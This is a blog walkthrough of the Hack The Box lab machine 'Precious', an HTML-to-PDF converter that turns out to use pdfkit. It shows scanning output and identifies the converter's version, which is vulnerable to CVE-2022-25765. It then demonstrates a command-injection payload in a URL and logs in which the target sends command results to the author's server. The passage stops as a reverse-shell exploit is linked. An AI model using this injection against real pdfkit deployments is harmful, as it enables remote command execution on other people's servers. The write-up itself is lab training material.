---
title: HTB Precious Walkthrough
url: https://www.secjuice.com/htb-precious-walkthrough/
source: Over Security - Cybersecurity news aggregator
date: 2024-11-26
fetch_date: 2025-10-06T19:22:22.014615
---

# HTB Precious Walkthrough

[![Secjuice](https://www.secjuice.com/content/images/2018/12/Logo-1.png)](https://www.secjuice.com)

* [Donate](https://opencollective.com/secjuice)
* [About Us](https://secjuice.com/about-us/)
* [Technical](https://secjuice.com/tag/technical/)
* [OSINT](https://secjuice.com/tag/OSINT/)
* [Unusual Journeys](https://secjuice.com/tag/unusual-journeys-into-infosec/)
* [HoF](https://secjuice.com/secjuice-hall-of-fame/)
* [Write With Us](https://secjuice.com/join-secjuice-writing-team/)
* [Hire A Writer](https://secjuice.com/hire-infosec-cybersecurity-writer/)
* [Rankings](https://secjuice.com/secjuice-writers-ranking/)

[Sign in](#/portal/signin)
[Subscribe](#/portal/signup)

[TECHNICAL](/tag/technical/)

# HTB Precious Walkthrough

Learn how to hack the box with this simple, vulnerable box. A simple nmap scan reveals a web page converter with a vulnerability in the pdfkit tool.

* [![Andy74](/content/images/size/w100/2020/01/avatar.png)](/author/andy74/)

#### [Andy74](/author/andy74/)

Nov 24, 2024
• 13 min read

![HTB Precious Walkthrough](/content/images/size/w2000/2024/11/turkeys-doing-Cirque-du-Soleil.jpeg)

Turkeys performing at a modern circus show. Microsoft Copilot created this image.

A really simple BOX to start gaining experience!

The **nmap** scan:

```
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 14:57 EST
Nmap scan report for 10.10.11.189
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.24 seconds
```

Of course, the only access point is the **HTTP** on port ***80***; insert the **precious.htb** domain in the **/etc/hosts** file and proceed.

![](https://www.secjuice.com/content/images/2022/12/image-1.png)

The portal seems to be a straightforward *converter* of Web pages to PDF. In addition to having a single access point, the feature leaves no doubt about the attack to be carried out, you just need to identify the exact **tool** used for the conversion and understand what kind of vulnerability it suffers from. By being able to enter a URL in the only available text field, the vulnerability could be hidden in the URL itself or in the page to be converted (the *payload*). We, therefore, verify that the BOX reaches us and that we can pass a personal *payload*; we start a native **php** server and insert our address in the form field.

```
┌──(in7rud3r㉿kali-muletto)-[~/Dropbox/hackthebox/_10.10.11.189 - Precious (lin)/attack]
└─$ php -S 10.10.14.79:5000
[Sun Dec 11 15:07:49 2022] PHP 8.1.12 Development Server (http://10.10.14.79:5000) started
[Sun Dec 11 15:08:11 2022] 10.10.11.189:45994 Accepted
[Sun Dec 11 15:08:11 2022] 10.10.11.189:45994 [404]: GET / - No such file or directory
[Sun Dec 11 15:08:11 2022] 10.10.11.189:45994 Closing
```

The ***404*** error code, however, does not start the conversion, so I prepared an empty **html** page, downloaded the output of the operation, and looked inside, looking for information concerning the tool used for the conversion.

```
%PDF-1.4
%âã
1 0 obj
<<
/Title ()
/Creator (��wkhtmltopdf 0.12.6)
/Producer (��Qt 5.15.2)
/CreationDate (D:20221211153322-05'00')
[...]
1037
%%EOF
%BeginExifToolUpdate
1 0 obj
<<
/Creator (Generated by pdfkit v0.8.6)
>>
endobj
11 0 obj
[...]
```

I was a bit confused. Inside the file there seem to be indications about two different conversion tools: **wkhtmltopdf** and **pdfkit**. They're both conversion tools, but I didn't understand why they're both being repurposed. However, the **exiftool** seems to identify the **pdfkit** in the metadata.

```
┌──(in7rud3r㉿kali-muletto)-[~/Downloads]
└─$ exiftool 9y7vtnuzxwr6isk3hdttvuy8fng2kxrx.pdf
ExifTool Version Number         : 12.51
File Name                       : 9y7vtnuzxwr6isk3hdttvuy8fng2kxrx.pdf
Directory                       : .
File Size                       : 4.6 kB
File Modification Date/Time     : 2022:12:11 15:37:29-05:00
File Access Date/Time           : 2022:12:11 15:38:06-05:00
File Inode Change Date/Time     : 2022:12:11 15:37:29-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

In order not to leave anything to chance, however, let's also take a look at the first one. Looking for *exploits* for the first tool, something comes up, but it doesn't seem to work despite multiple attempts.

[NVD - CVE-2022-35583

![](https://nvd.nist.gov/site-media/images/favicons/apple-touch-icon.png)National Institute of Standards and Technology logo

![](https://nvd.nist.gov/site-media/images/usbanner/us_flag_small.png)](https://nvd.nist.gov/vuln/detail/CVE-2022-35583?ref=secjuice.com)

Convinced that it is still the second tool that is really the object of the challenge, I want to look for exploits for this second one.

[CVE-2022-25765 - GitHub Advisory Database

PDFKit vulnerable to Command Injection

![](https://github.com/fluidicon.png)GitHub

![](https://github.githubassets.com/images/modules/site/social-cards/advisory-database-show.png)](https://github.com/advisories/GHSA-rhwx-hjx2-x4qr?ref=secjuice.com)

A nice list.

[Snyk Vulnerability Database | Snyk

High severity (7.3) Command Injection in pdfkit | CVE-2022-25765

![](https://snyk.io/favicon.png)Learn more about RubyGems with Snyk Open Source Vulnerability Database

![](https://res.cloudinary.com/snyk/image/upload/v1468845142/logo/snyk-avatar.png)](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795?ref=secjuice.com)

And that looked really interesting. I immediately tried with the verification *payload* shown in the example, which gave me good results. Sleep seems to have been performed before the conversion process and the pdf is returned to me after the 15 seconds indicated, increasing the time of the command also increases the interval before the download starts.

```
http://10.10.14.14:5000/file.html?name=#{'%20`sleep 15`'}
```

We should have identified the vulnerability. Now, let's see how to use it. The second example *payload* also provides useful information, and the commands interpreted by the converter are reported as processed data in the URL addressed to my **php** server.

```
[Mon Dec 12 15:42:45 2022] 10.10.11.189:53504 Accepted
[Mon Dec 12 15:42:45 2022] 10.10.11.189:53504 [200]: GET /file.html?pwd=/var/www/pdfapp&user=ruby
[Mon Dec 12 15:42:45 2022] 10.10.11.189:53504 Closing
```

All we have to do is insist on this path, and try to recover as much information as possible and perhaps take advantage of the execution of commands via *injection* of the payload into the **URLs**. Despite my attempts, I still couldn't recover the data in the most common files, so I decided to look for a more specific *payload* for this attack that allowed me to exploit an **RCE,** and I found it easily.

[CVE-2022-25765-pdfkit-Exploit-Reverse-Shell | CTF导航

CVE-2022-25765-pdfkit-Exploit-Reverse-Shell pdfkit <0.8.6 command injection shell. The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized. (Tes...

![](http://www.ctfiot.com/wp-content/themes/onenav/images/app-ico.png)CTF导航4986文章

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/51708d4cd0216b0960949cf3fffd117847e65e45.jpg@942w_531h_p...